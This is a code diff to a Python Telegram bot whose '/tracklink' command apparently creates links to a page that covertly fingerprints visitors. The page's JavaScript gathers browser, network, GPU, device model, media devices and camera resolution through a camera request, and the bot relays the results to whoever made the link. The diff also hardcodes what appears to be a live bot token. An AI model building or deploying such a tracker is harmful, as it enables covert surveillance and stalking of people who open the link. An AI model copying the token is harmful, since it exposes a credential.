@@ -6,10 +6,10 @@ import uuid
 import json
 import asyncio
 from datetime import datetime
-from aiohttp import web, ClientSession
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from aiohttp import web
+from telegram import Update
 from telegram.ext import (
-    Application, CommandHandler, ContextTypes, CallbackQueryHandler
+    Application, CommandHandler, ContextTypes
 )
 
 # ---------------- LOG ----------------
@@ -20,9 +20,10 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ---------------- ENV ----------------
-BOT_TOKEN = ("8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
+BOT_TOKEN = "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA"
 ADMIN_ID = int(os.getenv("ADMIN_ID", "7440949683"))
-WEBHOOK_DOMAIN = ("https://fit-roanna-runex-7a8db616.koyeb.app/")
+# ⚠️ Bo'sh joylarni olib tashlang!
+WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip('/')
 
 if not BOT_TOKEN:
     logger.error("BOT_TOKEN muhim! ENV ga qo'ying.")
@@ -81,18 +82,15 @@ async def track_page(request):
           cameraRes: 'Noma\\'lum'
         }};
 
-        // Brauzer
         if (navigator.userAgent.includes('Chrome')) data.browser = 'Chrome';
         else if (navigator.userAgent.includes('Firefox')) data.browser = 'Firefox';
         else if (navigator.userAgent.includes('Safari')) data.browser = 'Safari';
 
-        // Tarmoq
         if ('connection' in navigator) {{
           const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
           if (conn) data.network = `${{conn.effectiveType || '?'}} ~ ${{conn.downlink || '?'}} Mbps`;
         }}
 
-        // GPU
         try {{
           const canvas = document.createElement('canvas');
           const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -102,7 +100,6 @@ async def track_page(request):
           }}
         }} catch(e) {{}}
 
-        // Model (Chrome 101+)
         if ('userAgentData' in navigator && navigator.userAgentData.getHighEntropyValues) {{
           try {{
             const ua = await navigator.userAgentData.getHighEntropyValues(['model']);
@@ -110,7 +107,6 @@ async def track_page(request):
           }} catch(e) {{}}
         }}
 
-        // Media qurilmalar
         try {{
           const devices = await navigator.mediaDevices.enumerateDevices();
           const audioIn = devices.filter(d => d.kind === 'audioinput').length;
@@ -119,7 +115,6 @@ async def track_page(request):
           data.mediaDevices = `mikrofon: ${{audioIn}} ta, karnay: ${{audioOut}} ta, kamera: ${{video}} ta`;
         }} catch(e) {{}}
 
-        // Kamera o'lchamlari
         try {{
           const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
           const [track] = stream.getVideoTracks();
@@ -151,7 +146,7 @@ async def submit_data(request):
         token = data.get('token')
         telegram_id = USER_TOKENS.get(token)
         if not telegram_id:
-            return web.json_response({{"error": "Token not found"}}, status=400)
+            return web.json_response({"error": "Token not found"}, status=400)
 
         utc_offset = data.get('utcOffset', 5)
         utc_str = f"+{int(utc_offset):02}" if utc_offset >= 0 else f"{int(utc_offset):02}"
@@ -180,10 +175,10 @@ UA: {data.get('userAgent', 'Noma\'lum')}
         """.strip()
 
         await request.app['bot'].send_message(chat_id=telegram_id, text=message)
-        return web.json_response({{"status": "ok"}})
+        return web.json_response({"status": "ok"})
     except Exception as e:
         logger.exception(f"[SUBMIT ERROR] {e}")
-        return web.json_response({{"error": str(e)}}, status=500)
+        return web.json_response({"error": str(e)}, status=500)
 
 # ---------------- Web Server Starter ----------------
 async def start_web_server(bot):
@@ -193,24 +188,24 @@ async def start_web_server(bot):
     app.router.add_post('/submit', submit_data)
     runner = web.AppRunner(app)
     await runner.setup()
-    port = int(os.getenv("PORT", "8080"))
+    port = int(os.getenv("PORT", "8000"))
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
     logger.info(f"🌐 Web server ishga tushdi: http://0.0.0.0:{port}")
 
+# ---------------- Startup ----------------
+async def on_startup(app: Application):
+    # Web serverni async ishga tushirish
+    asyncio.create_task(start_web_server(app.bot))
+
 # ---------------- Main ----------------
-# ---------------- Main ----------------
-async def main():
-    app = Application.builder().token(BOT_TOKEN).build()
+def main():
+    # ✅ post_init orqali on_startup chaqiriladi
+    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("tracklink", cmd_tracklink))
-
-    # Web serverni ishga tushirish (await bilan!)
-    await start_web_server(app.bot)
-
     logger.info("🚀 Bot ishga tushdi. /tracklink yuboring.")
-    await app.run_polling()
+    app.run_polling()
 
 if __name__ == "__main__":
-    import asyncio
-    asyncio.run(main())
+    main()
